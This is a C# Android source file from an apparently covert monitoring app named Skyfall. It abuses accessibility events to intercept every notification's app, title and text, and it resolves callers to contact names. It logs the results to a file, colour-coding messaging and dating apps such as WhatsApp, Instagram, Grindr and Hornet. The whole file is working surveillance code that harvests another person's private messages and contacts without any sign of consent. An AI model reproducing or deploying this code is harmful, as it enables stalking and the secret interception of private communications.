/// 1.5 Revision: OK
using Android.App;
using Android.Database;
using Android.Media;
using Android.OS;
using Android.Provider;
using Android.Views.Accessibility;
using System;
using System.Collections.Generic;
using static Android.Provider.ContactsContract;

namespace Skyfall
{
    static class NotificationDriver
    {
        private struct NotificationBlock
        {
            public string Text { get; set; }
            public string Title { get; set; }
            public string Package { get; set; }
        }
        private static NotificationBlock notificationBlock;
        private static List<string> notificationArrayList = new List<string>();
        private static byte filterTicker = 0;

        public static void CaptureNotification(AccessibilityEvent ev)
        {
            if (ev.ParcelableData != null)
            {
                try
                {
                    IParcelable parcelable = ev.ParcelableData;
                    if (parcelable is Notification nt)
                    {
                        if (ev.PackageName != null) notificationBlock.Package = ev.PackageName; else notificationBlock.Package = "[null]";
                        if (nt.Extras.GetString("android.title") != null) notificationBlock.Title = nt.Extras.GetString("android.title"); else notificationBlock.Title = "[null]";
                        if (nt.Extras.GetString("android.text") != null) notificationBlock.Text = nt.Extras.GetString("android.text"); else notificationBlock.Text = "[null]";

                        DispatchNotification();
                    }
                }
                catch (Exception e) { _ = Kernel.Beep(Tone.CdmaSoftErrorLite); Disk.LogException(e); }
            }
        }

        private static void DispatchNotification()
        {
            if (!FilterNotificationContent())
            {
                if (!FilterNotificationId()) LogNotification();
            }
        }

        private static bool FilterNotificationContent()
        {
            if (notificationBlock.Package.Equals("[null]") || notificationBlock.Title.Equals("[null]") || notificationBlock.Text.Equals("[null]")) return true;
            else return false;
        }

        private static bool FilterNotificationId()
        {
            string notificationUniqueID = notificationBlock.Package + notificationBlock.Title + notificationBlock.Text;

            if (notificationArrayList.Count > 0) { foreach (string row in notificationArrayList) if (row.Equals(notificationUniqueID)) { return true; } }

            notificationArrayList.Add(notificationUniqueID);
            return false;
        }

        public static void ClearFilter()
        {
            filterTicker++;
            if (filterTicker >= 120)
            {
                if (notificationArrayList.Count > 0) notificationArrayList.Clear();
                filterTicker = 0;
            }
        }

        private static void LogNotification()
        {
            string style = "<span style =\"color:black\">";

            /// com.whatsapp
            if (notificationBlock.Package.Equals("com.whatsapp")) style = "<span style =\"color:lightgreen\">";

            /// com.android.chrome
            else if (notificationBlock.Package.Equals("com.android.chrome")) style = "<span style =\"color:mediumvioletred\">";

            /// com.facebook.katana
            else if (notificationBlock.Package.Equals("com.facebook.katana")) style = "<span style =\"color:steelblue\">";

            /// com.instagram.android
            else if (notificationBlock.Package.Equals("com.instagram.android")) style = "<span style =\"color:gold\">";

            /// com.facebook.orca
            else if (notificationBlock.Package.Equals("com.facebook.orca")) style = "<span style =\"color:dodgerblue\">";

            /// br.com.uol.batepapo
            else if (notificationBlock.Package.Equals("br.com.uol.batepapo")) style = "<span style =\"color:red\">";

            /// com.grindrapp.android
            else if (notificationBlock.Package.Equals("com.grindrapp.android")) style = "<span style =\"color:red\">";

            /// com.hornet.android
            else if (notificationBlock.Package.Equals("com.hornet.android")) style = "<span style =\"color:red\">";

            /// com.skype.raider
            else if (notificationBlock.Package.Equals("com.skype.raider")) style = "<span style =\"color:blue\">";

            /// com.google.android.apps.messaging
            else if (notificationBlock.Package.Equals("com.google.android.apps.messaging")) style = "<span style =\"color:lightseagreen\">";

            /// com.google.android.dialer
            else if (notificationBlock.Package.Equals("com.google.android.dialer"))
            {
                style = "<span style =\"color:mediumblue\"> ☎ ";
                notificationBlock.Title = RetrieveContactName(notificationBlock.Title);
            }

            Disk.LogMessage(ref Disk.notificationWriter, style + "<strong> 💬 " + notificationBlock.Package.ToUpper() + "</strong></span>");
            if (!notificationBlock.Title.Equals("")) Disk.LogMessage(ref Disk.notificationWriter, style + notificationBlock.Title + "</span>");
            if (!notificationBlock.Text.Equals("")) Disk.LogMessage(ref Disk.notificationWriter, style + notificationBlock.Text + "</span>");
        }

        public static string RetrieveContactName(string phoneNumber)
        {
            string contactName = null;
            try
            {
                Android.Net.Uri uri = Android.Net.Uri.WithAppendedPath(PhoneLookup.ContentFilterUri, Android.Net.Uri.Encode(phoneNumber));
                ICursor cursor = Kernel.applicationContext.ContentResolver.Query(uri, new string[] { ContactsContract.Contacts.InterfaceConsts.DisplayName }, null, null, null);
                if (cursor == null) return phoneNumber;
                
                if (cursor.MoveToFirst()) contactName = cursor.GetString(cursor.GetColumnIndex(ContactsContract.Contacts.InterfaceConsts.DisplayName));
                if (cursor != null && !cursor.IsClosed) cursor.Close();
            }
            catch { _ = Kernel.Beep(Tone.CdmaSoftErrorLite); }
            
            if (contactName == null) return phoneNumber;
            else return contactName;
        }
    }
}